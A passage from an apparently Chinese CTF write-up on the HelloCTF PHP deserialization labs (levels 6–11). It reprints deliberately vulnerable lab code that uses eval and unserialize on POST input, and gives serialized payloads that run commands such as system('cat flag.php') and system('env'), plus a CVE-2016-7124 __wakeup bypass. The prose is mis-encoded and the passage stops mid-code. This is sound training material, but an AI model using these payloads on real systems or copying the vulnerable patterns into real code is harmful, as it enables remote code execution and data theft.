invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&amp;private_key=&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>)).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>urlç¼–ç çš„ä½œç”¨æ˜¯æˆåŠŸä¼ å…¥ç©ºå­—ç¬¦ï¼Œè·å¾—playloadï¼Œä¼ é€’åè·å¾—flag</p><p><code>protected_key=O%3A12%3A%22protectedKEY%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00protected_key%22%3Bs%3A13%3A%22protected_key%22%3B%7D</code><br><code>&amp;private_key=O%3A10%3A%22privateKEY%22%3A1%3A%7Bs%3A23%3A%22%00privateKEY%00private_key%22%3Bs%3A11%3A%22private_key%22%3B%7D</code></p><br /><h3 id="Level-7-å®ä¾‹åŒ–å’Œååºåˆ—åŒ–"><a href="#Level-7-å®ä¾‹åŒ–å’Œååºåˆ—åŒ–" class="headerlink" title="Level 7: å®ä¾‹åŒ–å’Œååºåˆ—åŒ–"></a>Level 7: å®ä¾‹åŒ–å’Œååºåˆ—åŒ–</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 7 : å®ä¾‹åŒ–å’Œååºåˆ—åŒ– --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINTï¼šå¯æ§çš„è¾“å…¥ ç®€å•çš„æ¼æ´æ¼”ç¤º / FLAG in flag.php</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag_command</span> = <span class="string">&quot;echo &#x27;Hello CTF!&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;flag_command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$unserialize_string</span> = <span class="string">&#x27;O:4:&quot;FLAG&quot;:1:&#123;s:12:&quot;flag_command&quot;;s:24:&quot;echo &#x27;</span>Hello World!&lt;br&gt;<span class="string">&#x27;;&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Instantiate_object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>(); <span class="comment">// å®ä¾‹åŒ–çš„å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Unserialize_object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$unserialize_string</span>); <span class="comment">// ååºåˆ—åŒ–çš„å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Instantiate_object</span>-&gt;<span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$Unserialize_object</span>-&gt;<span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="string">&#x27;$Instantiate_object-&gt;backdoor()&#x27;</span> will output:Hello CTF!</span><br><span class="line"><span class="string">&#x27;$Unserialize_object-&gt;backdoor()&#x27;</span> will output:Hello World!</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/* Now Your Turn */</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>])-&gt;<span class="title function_ invoke__">backdoor</span>();</span><br></pre></td></tr></table></figure><p>ç®€å•çš„åºåˆ—åŒ–æ‰§è¡Œå‘½ä»¤ï¼Œå°†<code>$flag_command</code>çš„å€¼ä¿®æ”¹ä¸º<code>&quot;system(&#39;cat flag.php&#39;);&quot;</code>åºåˆ—åŒ–ä¼ å…¥åå³å¯è¯»å–flagï¼Œæ„é€ playload</p><p><code>o=O:4:&quot;FLAG&quot;:1:{s:12:&quot;flag_command&quot;;s:23:&quot;system(&#39;cat flag.php&#39;);&quot;;}</code></p><br /><h3 id="ï¼ˆç‰¹æ€§ï¼‰Level-8-æ„é€ å‡½æ•°å’Œææ„å‡½æ•°ä»¥åŠGCæœºåˆ¶"><a href="#ï¼ˆç‰¹æ€§ï¼‰Level-8-æ„é€ å‡½æ•°å’Œææ„å‡½æ•°ä»¥åŠGCæœºåˆ¶" class="headerlink" title="ï¼ˆç‰¹æ€§ï¼‰Level 8: æ„é€ å‡½æ•°å’Œææ„å‡½æ•°ä»¥åŠGCæœºåˆ¶"></a>ï¼ˆç‰¹æ€§ï¼‰Level 8: æ„é€ å‡½æ•°å’Œææ„å‡½æ•°ä»¥åŠGCæœºåˆ¶</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 8 : æ„é€ å‡½æ•°å’Œææ„å‡½æ•° --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINTï¼šæ³¨æ„é¡ºåºå’Œæ¬¡æ•°</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$destruct_flag</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$construct_flag</span>;</span><br><span class="line"><span class="variable">$destruct_flag</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$construct_flag</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$class_name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;class_name = <span class="variable">$class_name</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$construct_flag</span>;</span><br><span class="line">        <span class="variable">$construct_flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Constructor called &quot;</span> . <span class="variable">$construct_flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$destruct_flag</span>;</span><br><span class="line">        <span class="variable">$destruct_flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Destructor called &quot;</span> . <span class="variable">$destruct_flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Object created*/</span></span><br><span class="line"><span class="variable">$demo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>(<span class="string">&#x27;demo&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">/*Object serialized*/</span></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$demo</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Object unserialized*/</span></span><br><span class="line"><span class="variable">$n</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">/*unserialized object destroyed*/</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$n</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*original object destroyed*/</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$demo</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*æ³¨æ„ æ­¤å¤„ä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºä¸ºæ‰‹åŠ¨é‡Šæ”¾ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå½“è„šæœ¬è¿è¡Œå®Œæ¯•åï¼Œphpä¼šå°†æœªæ˜¾å¼é”€æ¯çš„å¯¹è±¡è‡ªåŠ¨é”€æ¯ï¼Œè¯¥è¡Œä¸ºä¹Ÿä¼šè°ƒç”¨ææ„å‡½æ•°*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*æ­¤å¤– è¿˜æœ‰æ¯”è¾ƒç‰¹æ®Šçš„æƒ…å†µ: PHPçš„GC(åƒåœ¾å›æ”¶æœºåˆ¶)ä¼šåœ¨è„šæœ¬è¿è¡Œæ—¶è‡ªåŠ¨ç®¡ç†å†…å­˜ï¼Œé”€æ¯ä¸è¢«å¼•ç”¨çš„å¯¹è±¡:*/</span></span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line">Object created:Constructor called <span class="number">1</span></span><br><span class="line">Object serialized: But Nothing <span class="title function_ invoke__">Happen</span>(:</span><br><span class="line">Object <span class="attr">unserialized</span>:But nothing happened either):</span><br><span class="line">serialized Object destroyed:Destructor called <span class="number">1</span></span><br><span class="line">original Object destroyed:Destructor called <span class="number">2</span></span><br><span class="line"></span><br><span class="line">This <span class="keyword">object</span> (<span class="string">&#x27;new FLAG();&#x27;</span>) will be destroyed immediately because it is not assigned to any variable:Constructor called <span class="number">2</span></span><br><span class="line">Destructor called <span class="number">3</span></span><br><span class="line"></span><br><span class="line">Now Your Turn!, Try to get the flag!</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RELFLAG</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Constructor called &quot;</span> . <span class="variable">$flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Destructor called &quot;</span> . <span class="variable">$flag</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag</span> &gt; <span class="number">5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;HelloCTF&#123;???&#125;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Check Detected flag is &quot;</span>. <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">check</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€è·¯å¾ˆå¤šï¼Œä¸€ä¸€åˆ—ä¸¾</p><h5 id="1-åˆ©ç”¨åµŒå¥—åºåˆ—åŒ–-ååºåˆ—åŒ–ï¼Œç¬¦åˆå‡ºé¢˜äººæ„å›¾ï¼Œplayload"><a href="#1-åˆ©ç”¨åµŒå¥—åºåˆ—åŒ–-ååºåˆ—åŒ–ï¼Œç¬¦åˆå‡ºé¢˜äººæ„å›¾ï¼Œplayload" class="headerlink" title="1.åˆ©ç”¨åµŒå¥—åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–ï¼Œç¬¦åˆå‡ºé¢˜äººæ„å›¾ï¼Œplayload"></a>1.åˆ©ç”¨åµŒå¥—åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–ï¼Œç¬¦åˆå‡ºé¢˜äººæ„å›¾ï¼Œplayload</h5><p><code>code=unserialize(serialize(unserialize(serialize(unserialize(serialize(unserialize(serialize(new RELFLAG()))))))));</code></p><p><code>serialize()</code>ã€<code>unserialize()</code>è¿™é‡Œé‡å¤è°ƒç”¨äº§ç”Ÿäº†å¤šä¸ªå¯¹è±¡ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è°ƒç”¨<code>__construct()</code>å’Œ<code>__destruct()</code>æ–¹æ³•ï¼Œä½¿<code>$flag</code>æ•°å€¼å¢åŠ çš„åŸå› æ˜¯GCæœºåˆ¶</p><h5 id="2-ç›´æ¥è°ƒç”¨-destruct-æ–¹æ³•ï¼Œplayload"><a href="#2-ç›´æ¥è°ƒç”¨-destruct-æ–¹æ³•ï¼Œplayload" class="headerlink" title="2.ç›´æ¥è°ƒç”¨__destruct()æ–¹æ³•ï¼Œplayload"></a>2.ç›´æ¥è°ƒç”¨<code>__destruct()</code>æ–¹æ³•ï¼Œplayload</h5><p><code>code=$a=new RELFLAG;$a-&gt;__destruct();$a-&gt;__destruct();$a-&gt;__destruct();$a-&gt;__destruct();$a-&gt;__destruct();</code></p><h5 id="3-ç›´æ¥ç»™-flagå¤åˆ¶ä¸º6ï¼Œplayload"><a href="#3-ç›´æ¥ç»™-flagå¤åˆ¶ä¸º6ï¼Œplayload" class="headerlink" title="3.ç›´æ¥ç»™$flagå¤åˆ¶ä¸º6ï¼Œplayload"></a>3.ç›´æ¥ç»™<code>$flag</code>å¤åˆ¶ä¸º6ï¼Œplayload</h5><p><code>code=$flag=6;</code></p><br /><h3 id="Level-9-æ„é€ å‡½æ•°çš„åé—¨"><a href="#Level-9-æ„é€ å‡½æ•°çš„åé—¨" class="headerlink" title="Level 9: æ„é€ å‡½æ•°çš„åé—¨"></a>Level 9: æ„é€ å‡½æ•°çš„åé—¨</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 9 : æ„é€ å‡½æ•°çš„åé—¨ --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINTï¼šä¼¼æ›¾ç›¸è¯†</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$flag_command</span> = <span class="string">&quot;echo &#x27;HelloCTF&#x27;;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span> (<span class="variable language_">$this</span>-&gt;flag_command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><code>__destruct()</code>ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œä¿®æ”¹å‘½ä»¤å³å¯ï¼Œwindowsæ­å»ºçš„é¶åœºæ‹¿ä¸åˆ°flagï¼Œè¿™é‡Œç”¨åŒæºçš„åœ¨çº¿é¶åœº</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$flag_command</span> = <span class="string">&quot;system(&#x27;env&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span> (<span class="variable language_">$this</span>-&gt;flag_command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>());</span><br></pre></td></tr></table></figure><p>è¾“å‡ºplayloadï¼š<code>o=O:4:&quot;FLAG&quot;:1:{s:12:&quot;flag_command&quot;;s:14:&quot;system(&#39;env&#39;);&quot;;}</code></p><br /><h3 id="Level-10-wakeup"><a href="#Level-10-wakeup" class="headerlink" title="Level 10: __wakeup()"></a>Level 10: __wakeup()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 10 : weakup! --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">unserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª __wakeup() æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ __wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚</span></span><br><span class="line"><span class="comment">é™¤å¼€æ„é€ å’Œææ„å‡½æ•°ï¼Œè¿™åº”è¯¥æ˜¯ä½ ç¬¬ä¸€ä¸ªçœŸæ­£æ„ä¹‰ä¸Šå¼€å§‹æ¥è§¦çš„é­”æœ¯æ–¹æ³•ï¼Œæ­¤åæ¯ä¸€ä¸ªé­”æœ¯æ–¹æ³•å¯¹åº”çš„é¢˜ç›®æˆ‘éƒ½ä¼šåœ¨è¿™é‡Œä»‹ç»ã€‚</span></span><br><span class="line"><span class="comment">å½“ç„¶ä½ ä¹Ÿå¯ä»¥ç›´æ¥æŸ¥é˜…PHPå®˜ç½‘æ–‡æ¡£ - é­”æœ¯æ–¹æ³•éƒ¨åˆ†ï¼šhttps://www.php.net/manual/zh/language.oop5.magic.php</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>());</span><br></pre></td></tr></table></figure><p>éšä¾¿å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡åºåˆ—åŒ–ä¼ ä¸Šå»å°±è¡Œ<code>o=O:4:&quot;FLAG&quot;:0:{}</code></p><br /><h3 id="ï¼ˆç‰¹æ€§ï¼‰Level-11-wakeup-CVE-2016-7124"><a href="#ï¼ˆç‰¹æ€§ï¼‰Level-11-wakeup-CVE-2016-7124" class="headerlink" title="ï¼ˆç‰¹æ€§ï¼‰Level 11: __wakeup() CVE-2016-7124"></a>ï¼ˆç‰¹æ€§ï¼‰Level 11: __wakeup() CVE-2016-7124</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 11 : Bypass weakup! --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CVE-2016-7124 - PHP5 &lt; 5.6.25 / PHP7 &lt; 7.0.10</span></span><br><span class="line"><span class="comment">åœ¨è¯¥æ¼æ´ä¸­ï¼Œå½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­å¯¹è±¡å±æ€§çš„å€¼å¤§äºçœŸå®å±æ€§å€¼æ—¶ä¾¿ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&quot;FAKEFLAG&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;sorry,flag is gone!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦æ è¿‡<code>__wakeup()</code>æ–¹æ³•çš„è°ƒç”¨ï¼Œç»“åˆhintï¼Œå¯¹è±¡å±æ€§çš„å€¼å¤§äºçœŸå®å±æ€§å€¼æ—¶ä¾¿ä¼šè·³è¿‡wakeupçš„æ‰§è¡Œï¼Œå…ˆæ„é€ åºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&quot;FAKEFLAG&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span 